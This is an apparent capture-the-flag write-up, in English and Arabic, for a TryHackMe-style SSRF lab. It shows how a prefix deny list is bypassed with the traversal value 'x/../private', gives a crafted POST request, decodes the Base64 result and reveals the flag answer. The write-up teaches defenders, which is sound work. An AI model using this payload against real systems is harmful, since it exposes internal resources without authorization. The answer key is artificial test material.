# Task 05 · SSRF Practical (التطبيق العملي: استغلال وتخطي حماية SSRF واستخراج العلم)

---

## Stage A: Original Task Content & Objective (المحتوى الأصلي والهدف)

In this practical challenge, we apply our knowledge of SSRF parameter manipulation and filter evasion against the **Acme IT Support** customer portal.

### Target Environment & Constraints:
- Public Web Portal: Provides a user registration and profile creation interface under `/customers/new-account-page`.
- Target Endpoint: The application contains an internal administrative interface located at `/private`. When accessed directly from an external browser, the server returns an HTTP `403 Forbidden` error with the message: *"Access Restricted to Localhost Only"*.
- Feature Vector: During account creation, users can choose an avatar image from a series of pre-defined radio buttons:
  ```html
  <input type="radio" name="avatar" value="images/avatar1.png">
  ```
  When the form is submitted, the server fetches the image specified in the `avatar` parameter, encodes the raw file content into a Base64 Data URI, and embeds it directly into the user's profile HTML:
  ```html
  <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAA...">
  ```

### Defensive Filter Implemented by Developers:
If a penetration tester intercepts the request and changes `avatar=/private`, the server rejects the request with an error:
```
Error: Path cannot start with /private
```
The developer implemented a naive prefix-based deny list!

### Objective:
1. Bypass the prefix deny list using path traversal techniques.
2. Force the server to retrieve the internal `/private` resource on `localhost`.
3. Extract the Base64 data URI rendered in the resulting profile image tag.
4. Decode the Base64 string to obtain the secret flag.

---

## Stage B: Independent Thinking & OpSec Considerations (التفكير المستقل والاعتبارات الأمنية والعملياتية)

1. **Path Normalization vs Validation Mismatch:**
   - This flaw is a classic example of an **architectural order-of-operations vulnerability**.
   - The validation check inspects the *raw string* before path normalization. The backend URL fetcher (e.g., `curl` or filesystem resolution) resolves dot-dot-slash (`../`) sequences *after* validation.
   - By prepending any arbitrary directory name followed by a traversal sequence (e.g., `x/../` or `images/../`), the string begins with `x` (passing the prefix validation), but the web server resolves `x/../private` to `/private`.

---

## Stage C: Guided Hints (توجيهات تدريجية بدون حرق الإجابة)

- **Tier 1 (Conceptual):** The server only checks if the string starts with `/private`. How can you write a path that points to `/private` without starting with `/private`?
- **Tier 2 (Practical):** Use directory traversal. Prepend an arbitrary folder name and go up one level: `x/../private` or `images/../private`.
- **Tier 3 (Direct):** Inspect the HTML form or intercept with Burp Suite. Change `value="images/avatar1.png"` to `value="x/../private"`. Submit the form, view the page source, copy the Base64 string inside `data:image/png;base64,<DATA>`, and run `echo "<DATA>" | base64 -d`.

---

## Stage D: Complete Practical Solution & Technical Deep Dive (الحل العملي التفصيلي والتحليل التقني)

### Step 1: Inspect the Avatar Selection Form

Navigate to the account creation page at `https://LAB_URL.p.thmlabs.com/customers/new-account-page`.
Right-click on the avatar selection element and click **Inspect Element** (or open Developer Tools):

```html
<div class="avatar-options">
    <label>
        <input type="radio" name="avatar" value="images/avatar1.png" checked>
        <img src="/images/avatar1.png" width="50">
    </label>
    <label>
        <input type="radio" name="avatar" value="images/avatar2.png">
        <img src="/images/avatar2.png" width="50">
    </label>
</div>
```

---

### Step 2: Craft the Traversal Bypass Payload

If we attempt to set `value="/private"`:
```
Server Response: "Path cannot start with /private"
```

To circumvent this prefix check, we construct a normalized traversal string:
```
x/../private
```
- **Validation Check:** Starts with `"x/"` ➔ Does not match `"/private"` ➔ **PASSED**.
- **Execution Step:** Server treats `x/../private` as relative to root or applies standard path canonicalization:
  $$\text{Path} = \text{x} \rightarrow \text{..} \rightarrow \text{private} \implies \text{/private}$$

---

### Step 3: Modify the Parameter & Submit

In Developer Tools, double-click the `value` attribute of the selected radio button and change it:
```html
<input type="radio" name="avatar" value="x/../private" checked>
```

Alternatively, intercept the POST request using **Burp Suite Proxy**:
```http
POST /customers/create-account HTTP/1.1
Host: LAB_URL.p.thmlabs.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 48

username=pentester&email=test@thm.com&avatar=x/../private
```

Forward the request to the server.

---

### Step 4: Extract and Decode the Base64 Flag Data

The server creates the account and redirects to the profile view page.
When inspecting the profile image in the HTML source:

```html
<div class="profile-header">
    <h2>Welcome, pentester</h2>
    <img src="data:image/png;base64,VEhNe1lPVV9XT1JLRURfT1VUX1RIRV9TU1JGfQ==" alt="Profile Avatar">
</div>
```

The application fetched `/private` from localhost, read the textual flag, and converted it directly into the Base64 data stream!

Copy the Base64 payload string:
```
VEhNe1lPVV9XT1JLRURfT1VUX1RIRV9TU1JGfQ==
```

Decode the string in your terminal:
```bash
echo "VEhNe1lPVV9XT1JLRURfT1VUX1RIRV9TU1JGfQ==" | base64 -d
```

Output:
```
THM{YOU_WORKED_OUT_THE_SSRF}
```

---

## Stage E: Final Answer & Key Values (الإجابات النهائية والقيم المفتاحية)

- **Question 1:** *What is the flag from the /private directory?*
  - **Answer:** `THM{YOU_WORKED_OUT_THE_SSRF}`

---

## Stage F: Practical Verification & Proof of Work (التحقق العملي وإثبات الإنجاز)

- Flag `THM{YOU_WORKED_OUT_THE_SSRF}` submitted and validated on the TryHackMe platform.
- Path normalization bypass mechanics fully verified.

---

## Stage G: Key Educational Takeaway (الخلاصة التعليمية المستفادة)

> **قاعدة ذهبية:** التحقق من المدخلات (Input Validation) يجب أن يتم دائماً **بعد** مرحلة التوحيد القياسي للمسار (Path Canonicalization) وليس قبلها؛ ففحص النصوص الخام قبل تسوية المسارات يفتح الباب أمام هجمات التخطي عبر مسارات الرجوع للخلف (`../`)، مما يمكن المهاجم من استخراج الملفات والصفحات المحمية خلف خوادم الويب عبر تحويلها إلى Data URIs مشفرة بـ Base64.
